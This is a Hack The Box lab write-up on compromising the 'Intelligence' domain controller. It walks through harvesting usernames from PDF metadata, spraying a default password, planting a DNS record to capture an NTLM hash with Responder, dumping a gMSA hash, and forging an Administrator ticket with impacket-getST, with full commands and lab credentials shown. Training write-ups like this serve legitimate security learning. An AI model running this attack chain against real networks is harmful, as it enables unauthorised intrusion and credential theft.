# HTB - Intelligence

#### Ip: 10.10.10.248
#### Name: Intelligence
#### Rating: Medium

----------------------------------------------------------------------

Intelligence.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.10.248
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-13 08:22 CST
Nmap scan report for 10.10.10.248
Host is up (0.085s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-13 21:22:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T21:24:19+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T21:24:20+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2024-02-13T21:24:19+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-13T21:24:20+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-02-13T21:23:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.99 seconds
```

Lets add intelligence.htb to our `/etc/hosts` file.

Checking out the site on port 80, we find a static looking site with lorem ipsum.

intelligence_site.png

Scrolling down we find a couple of links to download PDFs:

intelligence_downloads.png

Both files appear just to also be lorem ipsum:

intelligence_first_pdf.png

We can download the PDFs to our machine and use exiftool to inspect the metadata:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ exiftool -a 2020-01-01-upload.pdf
ExifTool Version Number         : 12.57
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:02:13 08:38:33-06:00
File Access Date/Time           : 2024:02:13 08:38:33-06:00
File Inode Change Date/Time     : 2024:02:13 08:38:33-06:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ exiftool -a 2020-12-15-upload.pdf
ExifTool Version Number         : 12.57
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2024:02:13 08:37:44-06:00
File Access Date/Time           : 2024:02:13 08:37:44-06:00
File Inode Change Date/Time     : 2024:02:13 08:37:44-06:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

Interesting. We've found two usernames, William.Lee and Jose.Willams. This also lets us know we've got a first_name.last_name naming convention.

Not finding much to do with these names I decided to fuzz for more PDFs in hopes of finding more information or usernames.

Both PDFs have the same naming convention (year-month-day-upload.pdf) so I made the following Pyhton script to create a wordlist in this format for each day of 2020.

```python
import datetime

# Define the start and end dates
start_date = datetime.date(2020, 1, 1)
end_date = datetime.date(2020, 12, 31)

# Open the file in write mode
with open("pdf_dates_list.txt", "w") as file:
    # Iterate over each day in 2020
    current_date = start_date
    while current_date <= end_date:
        # Format the date as YYYY-MM-DD-upload.pdf
        formatted_date = current_date.strftime("%Y-%m-%d") + "-upload.pdf"
        
        # Write the formatted date to the file
        file.write(formatted_date + "\n")
        
        # Move to the next day
        current_date += datetime.timedelta(days=1)

print("Output has been saved to pdf_dates_list.txt")
```

I can run this and confirm the script worked as intended:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ python date_print.py
Output has been saved to pdf_dates_list.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ head pdf_dates_list.txt 
2020-01-01-upload.pdf
2020-01-02-upload.pdf
2020-01-03-upload.pdf
2020-01-04-upload.pdf
2020-01-05-upload.pdf
2020-01-06-upload.pdf
2020-01-07-upload.pdf
2020-01-08-upload.pdf
2020-01-09-upload.pdf
2020-01-10-upload.pdf
```

Lets use the list with Gobuster to fuzz and see if we can find any other PDFs:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ gobuster dir -w pdf_dates_list.txt -u http://intelligence.htb/documents/
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intelligence.htb/documents/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                pdf_dates_list.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/02/13 09:00:56 Starting gobuster in directory enumeration mode
===============================================================
/2020-01-01-upload.pdf (Status: 200) [Size: 26835]
/2020-01-04-upload.pdf (Status: 200) [Size: 27522]
/2020-01-02-upload.pdf (Status: 200) [Size: 27002]
/2020-01-10-upload.pdf (Status: 200) [Size: 26400]
/2020-01-20-upload.pdf (Status: 200) [Size: 11632]
/2020-01-23-upload.pdf (Status: 200) [Size: 11557]
/2020-01-25-upload.pdf (Status: 200) [Size: 26252]
/2020-01-22-upload.pdf (Status: 200) [Size: 28637]
/2020-01-30-upload.pdf (Status: 200) [Size: 26706]
/2020-02-11-upload.pdf (Status: 200) [Size: 25245]
/2020-02-17-upload.pdf (Status: 200) [Size: 11228]
/2020-02-23-upload.pdf (Status: 200) [Size: 27378]
<SNIP>
```

This scan showed there were tons more PDFs out there to ennumerate.

We'll need to update the script to download the PDFs for us when discovered, because there were way too many to enumerate manually.

(My Python skills are mediocre at best, so ChatGPT did the heavy lifting on this one for me)

```python
import datetime
import os
import requests

# Function to download file using curl
def download_file(url, filename):
    os.system(f"curl -o {filename} {url}")

# Define the start and end dates
start_date = datetime.date(2020, 1, 1)
end_date = datetime.date(2020, 12, 31)

# Open the file in write mode
with open("pdf_dates_list.txt", "w") as file:
    # Iterate over each day in 2020
    current_date = start_date
    while current_date <= end_date:
        # Format the date as YYYY-MM-DD-upload.pdf
        formatted_date = current_date.strftime("%Y-%m-%d") + "-upload.pdf"
        
        # Write the formatted date to the file
        file.write(formatted_date + "\n")
        
        # Check if the file exists and download it if status code is 200
        url = f"http://intelligence.htb/documents/{formatted_date}" 
        response = requests.head(url)
        if response.status_code == 200:
            download_file(url, formatted_date)
            print(f"File {formatted_date} downloaded successfully")
        
        # Move to the next day
        current_date += datetime.timedelta(days=1)

print("Output has been saved to pdf_dates_list.txt")
```

Running the script from a directory I called `pdfs` we can see the discovered PDFs being downloaded by curl:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ python ../date_print.py                                      
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 26835  100 26835    0     0  67871      0 --:--:-- --:--:-- --:--:-- 67936
File 2020-01-01-upload.pdf downloaded successfully
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27002  100 27002    0     0  75246      0 --:--:-- --:--:-- --:--:-- 75214
File 2020-01-02-upload.pdf downloaded successfully
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 27522  100 27522    0     0   108k      0 --:--:-- --:--:-- --:--:--  108k
File 2020-01-04-upload.pdf downloaded successfully
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 26400  100 26400    0     0  99510      0 --:--:-- --:--:-- --:--:-- 99622
```

Once the script is finished we can check that all the found PDFs were downloaded:

intelligence_lotsa_pdfs.png

Using exiftool again in conjunction with `grep` we can isolate and discover several more usernames:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ exiftool -a *.pdf | grep Creator
Creator                         : William.Lee
Creator                         : Scott.Scott
Creator                         : Jason.Wright
Creator                         : Veronica.Patel
Creator                         : Jennifer.Thomas
Creator                         : Danny.Matthews
Creator                         : David.Reed
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
Creator                         : John.Coleman
Creator                         : Jason.Wright
Creator                         : Jose.Williams
Creator                         : Daniel.Shelton
Creator                         : Brian.Morris
<SNIP>
```

Lets copy this output to a file called temp:
```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ head temp              
Creator                         : William.Lee
Creator                         : Scott.Scott
Creator                         : Jason.Wright
Creator                         : Veronica.Patel
Creator                         : Jennifer.Thomas
Creator                         : Danny.Matthews
Creator                         : David.Reed
Creator                         : Stephanie.Young
Creator                         : Daniel.Shelton
Creator                         : Jose.Williams
```

We can then use `awk` to isolate just the usernames and dump the output to a file called users.txt:
```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ cat temp | awk -F ":" '{print $2}' > users.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ head users.txt 
 William.Lee
 Scott.Scott
 Jason.Wright
 Veronica.Patel
 Jennifer.Thomas
 Danny.Matthews
 David.Reed
 Stephanie.Young
 Daniel.Shelton
 Jose.Williams
```

This is a pretty big username list and my python script didn't do any sorting, so there are several duplicates or repeats in the list. We can sort the list so only unique values are listed and dump that to a new file called uzers.txt:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ wc users.txt         
  84   84 1260 users.txt
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ sort users.txt | uniq > uzers.txt 
                                                                                                                             
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ wc uzers.txt 
 30  30 456 uzers.txt
```

So we've got a nice list of users, but so far nothing really to do with them. I tried kerbrute, Impacket-GetNPUsers, CME null authentication, etc all with no luck.

Deciding to go back to our PDFs for more information, lets do some enumeration.

Unfortunately we cant just recursively grep through the file while they are in PDF format, and manually  enumerating all of them would take too much time.

Lets install a tool called pdftotext to change the .pdf files to .txt files, which we can use `grep` against. We can use a simple bash for loop for this:


```
┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ for file in *.pdf; do pdftotext -layout "$file"; done

┌──(ryan㉿kali)-[~/HTB/Intelligence/pdfs]
└─$ ll
total 2356
-rw-r--r-- 1 ryan ryan 26835 Feb 13 09:21 2020-01-01-upload.pdf
-rw-r--r-- 1 ryan ryan   773 Feb 13 10:06 2020-01-01-upload.txt
-rw-r--r-- 1 ryan ryan 27002 Feb 13 09:21 2020-01-02-upload.pdf
-rw-r--r-- 1 ryan ryan  1442 Feb 13 10:06 2020-01-02-upload.txt
-rw-r--r-- 1 ryan ryan 27522 Feb 13 09:21 2020-01-04-upload.pdf
-rw-r--r-- 1 ryan ryan  1088 Feb 13 10:06 2020-01-04-upload.txt
<SNIP>
```
Now we can use `grep` to search the files for interesting strings. Naturally we're most interested in discovering a password, so lets run:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ grep -R -i "password" pdfs                 
pdfs/2020-06-04-upload.txt:Please login using your username and the default password of:
pdfs/2020-06-04-upload.txt:After logging in please change your password as soon as possible.
```
Nice, we got a hit. 2020-06-04-upload.txt seems very interesting!

intelligence_pw.png

Awesome, we've discovered the default account setup password: NewIntelligenceCorpUser9876

Lets spray this against our users list in hopes someone didn't update their password after onboarding:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ crackmapexec smb intelligence.htb -u uzers.txt -p 'NewIntelligenceCorpUser9876' | grep [+] 
SMB         intelligence.htb 445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

Seeing which shares Tiffany.Molina can read we see she can access the IT and Users  non-default shares.

intelligence_tiff-shares.png

Looking in the IT share we find a downdector.ps1 script:

```powershell
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

And in the Users share we can access the user.txt flag on Tiffany's Desktop, but lets hold off on that until we actually have a shell:

```
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 19:51:46 2021
  ..                                 DR        0  Sun Apr 18 19:51:46 2021
  user.txt                           AR       34  Tue Feb 13 15:22:23 2024
```

Going back to downdetector.ps1 we can see the script is scanning for AD servers beginning in `web*` and trying to authenticate to the server using Ted.Graves credentials. If the authentication is unsuccessful (i.e anything but a 200 is returned) it emails Ted.Graves.

If we could forge a phony DNS record, we may be able to capture Ted.Grave's attempt to authenticate to it via Responder.

To do this lets use dnstool.py in the https://github.com/dirkjanm/krbrelayx repo.

Lets create a record and call it webTest pointing back to our attacking machine:

```
┌──(ryan㉿kali)-[~/Tools/exploits/krbrelayx]
└─$ python dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -r 'webTest' -d 10.10.14.60 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

We can then set up a Responder listener:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ sudo responder -I tun0 
```

And wait for the downdetector.ps1 script to run (could take up to 5 minutes)

Nice, that worked! We captured Ted.Graves hash as his script attempted to authenticate to our record:

intelligence_responder.png

Lets try cracking it in John:

intelligence_john1.png

Cool, we now have Ted.Graves password: Mr.Teddy

Still unable to logon anywhere, and not finding anything of use in SMB, I run bloodhound-python to enumerate the domain and user privileges:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -ns 10.10.10.248 --zip
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: svc_int.intelligence.htb
INFO: Querying computer: dc.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The resolution lifetime expired after 3.2081212997436523 seconds: Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.; Server 10.10.10.248 UDP port 53 answered The DNS operation timed out.
INFO: Done in 00M 21S
INFO: Compressing output into 20240213112552_bloodhound.zip
```

Looking through the results after marking Ted.Graves and Tiffany.Molina as 'owned' we can see that Ted.Graves can read the GMSA password of service account svc_int:

intelligence_bloodhound.png

We can read the GMSA password with gMSADUmper.py https://github.com/micahvandeusen/gMSADumper:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ python gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::d365e889367ce3e3241b120db1df6e25
svc_int$:aes256-cts-hmac-sha1-96:bdc4e5d502f64ffc7b7044c5a2ca5e41fe784866fcfa548b5b16dfdb73c30d63
svc_int$:aes128-cts-hmac-sha1-96:ce17e93d890939760b64a37bac296dd2
```

Nice, we've got the NT hash.

We can now attempt to impersonate the administrator on the box using impacket-getST:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ impacket-getST -k -impersonate Administrator -spn www/dc.intelligence.htb intelligence.htb/svc_int -hashes :d365e889367ce3e3241b120db1df6e25
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Dang, looks like my box's time difference is too much for this to work out of the box. 

We can fix this with rdate:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ sudo timedatectl set-ntp off

┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ sudo rdate -n 10.10.10.248
```
(Don't forget to turn it back on when you're done!)

Now that the clocks are synced we can run:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ impacket-getST -k -impersonate Administrator -spn www/dc.intelligence.htb intelligence.htb/svc_int -hashes :d365e889367ce3e3241b120db1df6e25
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

Then:
```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ export KRB5CCNAME=Administrator.ccache 
```

We can now logon with impacket-wmiexec:

```
┌──(ryan㉿kali)-[~/HTB/Intelligence]
└─$ KRB5CCNAME=Administrator.ccache impacket-wmiexec -k -no-pass administrator@dc.intelligence.htb
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
```

And grab both the flags:

intelligence_user.png

intelligence_root.png

Thanks for following along!

-Ryan

